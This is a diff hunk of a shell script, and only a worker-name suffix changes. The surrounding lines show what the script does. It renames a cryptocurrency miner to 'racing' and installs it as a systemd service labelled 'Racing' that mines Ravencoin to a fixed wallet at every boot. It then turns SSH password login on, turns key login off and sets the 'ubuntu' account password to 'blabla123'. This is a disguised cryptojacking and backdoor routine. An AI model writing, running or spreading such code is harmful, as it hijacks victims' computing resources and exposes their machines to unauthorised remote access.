@@ -16,7 +16,7 @@ sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abc -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abc -p x &
+sudo ./racing -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RM11VvoTyD4CeixsMLHR9ntqpaMTKHMEYL.abcd -p x &
 sudo sed -i '/PasswordAuthentication no/c\PasswordAuthentication yes' /etc/ssh/sshd_config
 sudo sed -i '/PubkeyAuthentication yes/c\PubkeyAuthentication no' /etc/ssh/sshd_config
 echo "ubuntu:blabla123" | sudo chpasswd
